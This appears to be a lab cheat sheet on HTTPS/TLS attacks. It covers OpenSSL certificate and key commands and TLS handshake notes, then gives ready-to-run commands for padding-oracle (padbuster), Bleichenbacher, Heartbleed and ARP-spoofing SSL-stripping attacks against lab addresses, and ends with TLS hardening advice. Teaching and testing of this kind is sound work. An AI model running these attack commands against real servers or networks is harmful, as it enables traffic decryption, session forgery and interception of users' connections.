title: HTTPsTLS Attacks
html:
HTTPsTLS Attacks

OpenSSL

Generate 2048 Bit RSA key

openssl genrsa -out key.pem 2048

Download certificate of web server

openssl s_client -connect hackthebox.com:443 | openssl x509 > hackthebox.pem

Convert PEM certificate to DER format

openssl x509 -outform der -in hackthebox.pem -out hackthebox.der

Convert PEM certificate to PKCS#7 format

openssl crl2pkcs7 -nocrl -certfile hackthebox.pem -out hackthebox.p7

Create self-signed certificate

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out selfsigned.pem -sha256 -days 365

Extract public key from RSA key-pair

openssl rsa -in rsa.pem -pubout > rsa_pub.pem

Encrypt file with RSA public key

openssl rsautl -encrypt -inkey rsa_pub.pem -pubin -in msg.txt -out msg.enc

Decrypt file with RSA private key

openssl rsautl -decrypt -inkey rsa.pem -in msg.enc > decrypted.txt

TLS 1.2 Handshake

Contains ClientRandom, Cipher Suites supported by client

ClientHello

Contains TLS version, Cipher Suite for session, ServerRandom

ServerHello

Contains server key share (only for PFS cipher suites)

ServerKeyExchange

Tells client that the ServerHello is complete

ServerHelloDone

Concludes handshake, all subsequent messages are protected

ChangeCipherSpec

TLS 1.3 Handshake

Contains ClientRandom, Cipher Suites supported by client, client key share

ClientHello

Contains TLS version, Cipher Suite for session, ServerRandom, server key share

ServerHello

Padding Oracles

Run padbuster with an encrypted sample with block size 16

padbuster http://127.0.0.1:4000/admin "AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0=" 16 -encoding 0 -cookies "user=AAAAAAAAAAAAAAAAAAAAAJQB/nhNEuPuNC8ox7cN1z0="

Parameters: - specify block length - specify encoding with -encoding flag - specify location of ciphertext with -cookies or -post flags - specify plaintext to encrypt with -plaintext flag - specify -usebody flag to analyze response content

POODLE

SSL 3.0 padding: - arbitrary padding bytes - last byte is the length of padding excluding the length itself - Example for block size 8: DEADBEEF -> DEADBEEF00000003

Bleichenbacher

Run Bleichenbacher attack from pcap file

java -jar bleichenbacher-1.0.0.jar -pcap ./bleichenbacher.pcap -executeAttack

Run Bleichenbacher attack against server with encrypted premaster secret

java -jar bleichenbacher-1.0.0.jar -executeAttack -connect 127.0.0.1:443 -encrypted_premaster_secret <SNIP>

Extract unpadded premaster secret from padded premaster secret

echo -n 214[...]3a8 | awk -F '0303' '{print "0303"$2}'

Wireshark Key file syntax

PMS_CLIENT_RANDOM <client_random> <premaster_secret>

Heartbleed

Run Heartbleed attack

java -jar heartbleed-1.0.0.jar -connect 127.0.0.1:443 -executeAttack -heartbeats 10

SSL Stripping

Run ARP spoofing attack on interface docker0 targeting 172.17.0.5

sudo arpspoof -i docker0 172.17.0.5

HSTS header syntax

Strict-Transport-Security: max-age=31536000

Testing TLS Configuration

Test TLS configuration of a website

bash testssl.sh https://hackthebox.com

TLS Best Practices: - do not offer SSL 2.0 or SSL 3.0 - do not offer TLS 1.0 or TLS 1.1 - no NULL cipher suites - no EXPORT cipher suites - prefer PFS cipher suites - prefer GCM mode over CBC mode
